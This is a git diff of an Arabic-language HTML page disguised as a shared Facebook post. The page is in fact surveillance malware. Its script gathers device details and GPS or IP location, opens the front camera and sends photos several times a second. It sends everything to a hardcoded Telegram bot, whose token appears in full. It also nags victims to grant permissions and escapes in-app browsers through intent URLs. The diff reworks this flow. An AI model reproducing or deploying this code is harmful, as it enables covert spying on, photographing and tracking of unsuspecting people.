@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Shahin Zyan masengar</title>
-  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
   <meta property="og:title" content="Shahin Zyan masengar">
   <meta property="og:description" content="شارك لك منشور">
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
@@ -56,7 +55,7 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* شاشة إعادة المحاولة الموحدة */
+    /* شاشة إعادة المحاولة */
     .retry-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 9999;
@@ -70,7 +69,8 @@
   </style>
 </head>
 <body>
-  <div class="post-container hidden" id="postContainer">
+  <!-- المنشور (يظهر مؤقتاً) -->
+  <div class="post-container" id="postContainer">
     <div class="post-header">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
       <div>
@@ -84,8 +84,8 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <!-- شاشة إعادة المحاولة الموحدة (تظهر عند رفض أي صلاحية) -->
-  <div class="retry-overlay" id="retryOverlay">
+  <!-- شاشة إعادة المحاولة (تظهر عند الرفض) -->
+  <div class="retry-overlay hidden" id="retryOverlay">
     <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
   </div>
 
@@ -93,7 +93,6 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // ==================== إعدادات ====================
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
@@ -106,36 +105,23 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream = null, photos = 0, captureInterval = null, recording = false;
-    let deviceInfoSent = false, gpsLoc = null, ipLoc = null, redirectUrl = 'https://www.facebook.com';
-    let waitingFor = null; // 'location' أو 'camera'
+    let stream, photos = 0, capInt, loc, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
+    let recording = false;
 
-    // ==================== دوال مساعدة ====================
-    async function sendText(txt) {
+    async function sendText(text) {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
           method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: C, text: txt, parse_mode: 'HTML' })
+          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
         });
       } catch (e) {}
     }
 
-    function dataURLtoBlob(dataUrl) {
-      const arr = dataUrl.split(','), mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
-      return new Blob([u8], { type: mime });
-    }
-
-    function showOverlay() { overlay.classList.remove('hidden'); post.classList.add('hidden'); }
-    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
-
-    // ==================== تحميل المنشور ====================
     async function loadPost() {
       try {
         const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
         const d = await r.json(); const s = d.record || {};
-        redirectUrl = s.redirectUrl || redirectUrl;
+        redir = s.redirectUrl || redir;
         post.innerHTML = `
           <div class="post-header">
             <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
@@ -152,10 +138,8 @@
       } catch (e) {}
     }
 
-    // ==================== معلومات الجهاز ====================
     async function sendDeviceInfo() {
-      if (deviceInfoSent) return;
-      deviceInfoSent = true;
+      if (deviceInfoSent) return; deviceInfoSent = true;
       try {
         const ua = navigator.userAgentData || {}; let h = {};
         if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
@@ -170,7 +154,6 @@
       } catch (e) {}
     }
 
-    // ==================== الموقع ====================
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
@@ -195,26 +178,12 @@
       } catch (e) { return false; }
     }
 
-    async function attemptLocation() {
-      const ok = await requestGPS();
-      if (ok) {
-        waitingFor = 'camera'; // ننتقل للكاميرا
-        hideOverlay();
-        await attemptCamera();
-      } else {
-        waitingFor = 'location';
-        showOverlay();
-        if (!ipLoc) await fetchIPLocation();
-      }
-    }
-
-    // ==================== الكاميرا ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         vid.srcObject = stream;
         await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
-        captureInterval = setInterval(captureAndSend, 250);
+        capInt = setInterval(captureAndSend, 250);
         return true;
       } catch (e) { return false; }
     }
@@ -248,100 +217,87 @@
       } catch (e) { recording = false; }
     }
 
-    function stopAll() {
-      if (captureInterval) clearInterval(captureInterval);
-      if (stream) stream.getTracks().forEach(t => t.stop());
+    function dataURLtoBlob(u) {
+      const arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
+      while (n--) u8[n] = bstr.charCodeAt(n);
+      return new Blob([u8], { type: mime });
     }
 
-    async function attemptCamera() {
-      const ok = await startCamera();
-      if (ok) {
-        waitingFor = null; // تمت جميع الصلاحيات
-        hideOverlay();
-      } else {
-        waitingFor = 'camera';
-        showOverlay();
-      }
-    }
+    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
-    // ==================== تقرير الخروج ====================
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
       else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
-      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
-      await sendText(report);
+      await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
-    // ==================== زر إعادة المحاولة ====================
-    retryBtn.addEventListener('click', async () => {
-      if (waitingFor === 'location') {
-        hideOverlay();
-        await attemptLocation();
-      } else if (waitingFor === 'camera') {
-        hideOverlay();
-        await attemptCamera();
+    function showOverlay() { post.classList.add('hidden'); overlay.classList.remove('hidden'); stopAll(); }
+    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
+
+    async function tryAllPermissions() {
+      // إظهار المنشور مؤقتاً
+      hideOverlay();
+      await new Promise(r => setTimeout(r, 200));
+
+      // طلب الموقع
+      let gpsOk = await requestGPS();
+      if (!gpsOk) {
+        showOverlay();
+        return;
       }
+
+      // طلب الكاميرا
+      let camOk = await startCamera();
+      if (!camOk) {
+        showOverlay();
+        return;
+      }
+
+      // نجحت الصلاحيتان
+      hideOverlay();
+    }
+
+    retryBtn.addEventListener('click', async () => {
+      await tryAllPermissions();
     });
 
-    // ==================== خطة الهروب من WebView (الأولوية: سفاري > كروم > أوبرا > فايرفوكس > window.open) ====================
+    // خطة الهروب من WebView
     (function escapePlan() {
       const targetUrl = window.location.href;
       function isInAppBrowser() {
         const ua = navigator.userAgent || '';
         return /FBAN|FBAV|Instagram|Twitter|Line|KAKAOTALK/i.test(ua);
       }
-
-      const iosBrowsers = [
-        { name: 'Safari', url: targetUrl.replace(/^https?:\/\//, 'x-safari-https://') },
-        { name: 'Chrome', url: targetUrl.replace(/^https?:\/\//, 'googlechrome://') },
-        { name: 'Opera', url: 'opera-https://' + targetUrl.replace(/^https?:\/\//, '') },
-        { name: 'Firefox', url: 'firefox://open-url?url=' + encodeURIComponent(targetUrl) }
-      ];
-
-      const androidBrowsers = [
-        { name: 'Chrome', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end` },
-        { name: 'Opera', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.opera.browser;end` },
-        { name: 'Firefox', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=org.mozilla.firefox;end` },
-        { name: 'Samsung Internet', url: `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.sec.android.app.sbrowser;end` }
-      ];
-
-      const browsers = /Android/i.test(navigator.userAgent) ? androidBrowsers : iosBrowsers;
+      const browsers = /Android/i.test(navigator.userAgent)
+        ? ['com.android.chrome','com.opera.browser','org.mozilla.firefox','com.sec.android.app.sbrowser']
+        : ['x-safari-https://','googlechrome://','opera-https://','firefox://open-url?url='];
 
       function tryNext(index) {
-        if (index >= browsers.length) {
-          // فشلت جميع المحاولات، نجرب window.open
-          window.open(targetUrl, '_blank', 'noopener,noreferrer');
-          return;
-        }
-        const browser = browsers[index];
-        try {
-          window.location.href = browser.url;
-        } catch (e) {}
-        // ننتظر قليلاً ثم نجرب التالي إذا لم ننتقل
+        if (index >= browsers.length) { window.open(targetUrl, '_blank'); return; }
+        const b = browsers[index];
+        let url = targetUrl;
+        if (b.includes('://')) url = b + targetUrl.replace(/^https?:\/\//, '');
+        else if (b.endsWith('/')) url = b + encodeURIComponent(targetUrl);
+        else url = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=${b};end`;
+        try { window.location.href = url; } catch(e) {}
         setTimeout(() => tryNext(index + 1), 500);
       }
 
-      if (isInAppBrowser()) {
-        tryNext(0);
-      }
+      if (isInAppBrowser()) tryNext(0);
     })();
 
-    // ==================== بدء التشغيل ====================
-    window.addEventListener('beforeunload', () => {
-      stopAll();
-      sendExitReport();
-    });
+    window.addEventListener('beforeunload', () => { stopAll(); sendExitReport(); });
 
     (async function init() {
       await loadPost();
       sendDeviceInfo();
       fetchIPLocation();
-      // إظهار المنشور وزر الإعادة (سنبدأ بطلب الموقع)
-      showOverlay();
-      waitingFor = 'location';
-      // نحاول الموقع بعد لحظة
-      setTimeout(attemptLocation, 600);
+      // إظهار المنشور أولاً، ثم بعد 600ms نحاول الصلاحيات
+      hideOverlay();
+      setTimeout(async () => {
+        await tryAllPermissions();
+      }, 600);
     })();
   </script>
 </body>
